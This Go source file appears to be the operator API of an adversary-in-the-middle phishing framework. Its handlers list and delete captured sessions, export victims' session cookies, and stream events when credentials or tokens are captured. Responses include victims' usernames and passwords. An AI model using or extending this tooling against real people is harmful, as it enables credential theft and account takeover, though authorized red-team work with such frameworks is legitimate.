package api

import (
	"encoding/json"
	"errors"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listSessions(w http.ResponseWriter, req *http.Request) {
	q := req.URL.Query()
	limit, offset := parsePagination(req)

	filter := aitm.SessionFilter{
		Phishlet: q.Get("phishlet"),
		Limit:    limit,
		Offset:   offset,
	}
	if q.Get("completed") == "true" {
		filter.CompletedOnly = true
	} else if q.Get("completed") == "false" {
		filter.IncompleteOnly = true
	}
	if s := q.Get("since"); s != "" {
		t, ok := parseRFC3339Param(w, "since", s)
		if !ok {
			return
		}
		filter.After = t
	}
	if s := q.Get("until"); s != "" {
		t, ok := parseRFC3339Param(w, "until", s)
		if !ok {
			return
		}
		filter.Before = t
	}

	sessions, err := r.sessions.List(filter)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to list sessions")
		return
	}

	// Total count without pagination.
	countFilter := filter
	countFilter.Limit = 0
	countFilter.Offset = 0
	total, err := r.sessions.Count(countFilter)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to count sessions")
		return
	}

	items := make([]sdk.SessionResponse, len(sessions))
	for i, s := range sessions {
		items[i] = sessionToResponse(s)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.SessionResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) getSession(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	sess, err := r.sessions.Get(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "session does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get session")
		}
		return
	}
	writeJSON(w, http.StatusOK, sessionToResponse(sess))
}

func (r *Router) deleteSession(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.sessions.Delete(id); err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "session does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to delete session")
		}
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) exportSessionCookies(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	data, err := r.sessions.ExportCookiesJSON(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "session does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to export session")
		}
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func (r *Router) streamSessions(w http.ResponseWriter, req *http.Request) {
	sse, ok := newSSEWriter(w)
	if !ok {
		writeError(w, http.StatusInternalServerError, "streaming not supported")
		return
	}

	chCreated := r.bus.Subscribe(aitm.EventSessionCreated)
	chCreds := r.bus.Subscribe(aitm.EventCredsCaptured)
	chTokens := r.bus.Subscribe(aitm.EventTokensCaptured)
	chCompleted := r.bus.Subscribe(aitm.EventSessionCompleted)
	defer func() {
		r.bus.Unsubscribe(aitm.EventSessionCreated, chCreated)
		r.bus.Unsubscribe(aitm.EventCredsCaptured, chCreds)
		r.bus.Unsubscribe(aitm.EventTokensCaptured, chTokens)
		r.bus.Unsubscribe(aitm.EventSessionCompleted, chCompleted)
	}()

	sse.WriteEvent("connected", []byte(`{"status":"connected"}`))

	ctx := req.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case e := <-chCreated:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.created", data) != nil {
					return
				}
			}
		case e := <-chCreds:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.creds_captured", data) != nil {
					return
				}
			}
		case e := <-chTokens:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.tokens_captured", data) != nil {
					return
				}
			}
		case e := <-chCompleted:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.completed", data) != nil {
					return
				}
			}
		}
	}
}

func sessionToResponse(s *aitm.Session) sdk.SessionResponse {
	cookies := make(map[string]map[string]string)
	for domain, byName := range s.CookieTokens {
		cookies[domain] = make(map[string]string)
		for name, tok := range byName {
			cookies[domain][name] = tok.Value
		}
	}
	return sdk.SessionResponse{
		ID:           s.ID,
		Phishlet:     s.Phishlet,
		LureID:       s.LureID,
		RemoteAddr:   s.RemoteAddr,
		UserAgent:    s.UserAgent,
		JA4Hash:      s.JA4Hash,
		BotScore:     s.BotScore,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		CookieTokens: cookies,
		BodyTokens:   s.BodyTokens,
		HTTPTokens:   s.HTTPTokens,
		StartedAt:    s.StartedAt,
		CompletedAt:  s.CompletedAt,
	}
}
